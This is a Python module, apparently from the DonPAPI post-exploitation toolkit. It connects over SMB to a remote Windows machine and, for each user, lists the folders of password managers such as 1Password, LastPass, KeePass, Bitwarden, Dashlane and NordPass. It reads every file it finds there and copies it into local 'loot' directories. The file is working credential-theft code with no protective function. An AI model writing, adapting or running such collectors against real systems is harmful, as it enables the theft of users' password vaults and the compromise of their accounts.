import os
import ntpath
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter
from donpapi.lib.utils import dump_file_to_loot_directories



class PasswordManagers:
    user_directories = [
        "Users\\{username}\\AppData\\Local\\1Password\\",
        "Users\\{username}\\AppData\\Roaming\\1Password\\",
        "Users\\{username}\\AppData\\Local\\LastPass\\",
        "Users\\{username}\\AppData\\LocalLow\\LastPass\\",
        "Users\\{username}\\AppData\\Roaming\\LastPass\\",
        "Users\\{username}\\AppData\\Local\\KeePass\\",
        "Users\\{username}\\AppData\\Roaming\\KeePass\\",
        "Users\\{username}\\AppData\\Roaming\\Dashlane\\",
        "Users\\{username}\\AppData\\Local\\Dashlane\\",
        "Users\\{username}\\AppData\\Local\\Bitwarden\\",
        "Users\\{username}\\AppData\\Roaming\\Bitwarden\\",
        "Users\\{username}\\AppData\\Local\\RoboForm\\",
        "Users\\{username}\\AppData\\Roaming\\RoboForm\\",
        "Users\\{username}\\AppData\\Local\\StickyPassword\\",
        "Users\\{username}\\AppData\\Roaming\\StickyPassword\\",
        "Users\\{username}\\AppData\\Local\\NordPass\\",
        "Users\\{username}\\AppData\\Roaming\\NordPass\\",
        "Users\\{username}\\AppData\\Local\\Enpass\\",
        "Users\\{username}\\Documents\\Enpass\\",
    ]

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.found = 0
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        
        self.logger.display("Gathering password managers files")
        for user in self.context.users:
            for directory in self.user_directories:
                directory_path = directory.format(username = user)
                self.dig_files(directory_path = directory_path, recurse_level = 0, recurse_max = 10)
        if self.found > 0:
            self.logger.secret(f"Found {self.found} password managers files", self.tag)

    def dig_files(self, directory_path, recurse_level = 0, recurse_max = 10):
        directory_list = self.conn.remote_list_dir(self.context.share, directory_path)
        if directory_list is not None:
            for item in directory_list:
                if item.get_longname() not in self.false_positive:
                    
                    new_path = ntpath.join(directory_path, item.get_longname())
                    file_content = self.conn.readFile(self.context.share, new_path)
                    if file_content is not None:
                        self.found += 1
                        absolute_local_filepath = os.path.join(self.context.target_output_dir, *(new_path.split('\\')))
                        dump_file_to_loot_directories(absolute_local_filepath, file_content)
                        
                        collector_dir_local_filepath = os.path.join(self.context.global_output_dir, self.tag, new_path.replace("\\", "_"))
                        dump_file_to_loot_directories(collector_dir_local_filepath, file_content)